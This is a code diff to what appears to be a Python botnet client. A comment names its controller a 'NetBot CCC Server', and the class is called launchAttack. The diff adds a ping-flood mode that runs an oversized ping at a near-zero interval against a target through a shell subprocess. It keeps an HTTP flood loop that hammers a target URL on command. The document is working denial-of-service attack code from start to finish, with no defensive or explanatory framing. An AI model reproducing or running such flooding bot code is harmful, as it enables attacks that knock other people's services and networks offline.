@@ -15,6 +15,8 @@ import time
 #import requests
 import os
 import urllib.request
+import subprocess
+import signal
 
 
 
@@ -27,15 +29,27 @@ class launchAttack:
 		self._running = False
       
 	def run(self, n):
-		while self._running and attackSet:
+		run = 0
+		#terminate = 0
+		if n[3]=="HTTPFLOOD":
+			while self._running and attackSet:
+				url_attack = 'http://'+n[0]+':'+n[1]+'/'
+				u = urllib.request.urlopen(url_attack).read()
+				time.sleep(int(n[4]))
 
-			url_attack = 'http://'+n[0]+':'+n[1]+'/'
-
-			#r = requests.get("http://192.168.0.151/")
-			u = urllib.request.urlopen(url_attack).read()
-			#print("Value ", n)
-			#print("URL", url_attack)
-			time.sleep(int(n[4]))
+		if n[3]=="PINGFLOOD":
+			while self._running:
+				if attackSet:
+					if run == 0:
+						url_attack = 'ping '+n[0]+' -i 0.0000001 -s 65000 > /dev/null 2>&1'
+						pro = subprocess.Popen(url_attack, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
+						run = 1
+				else:
+					if run == 1:
+						os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
+						run = 0
+						break
+				
 
 
 def Main():
@@ -45,6 +59,8 @@ def Main():
 	attackSet = 0
 	global updated
 	updated = 0
+	global terminate
+	terminate = 0
 
 
 	host = '192.168.0.174' # NetBot CCC Server
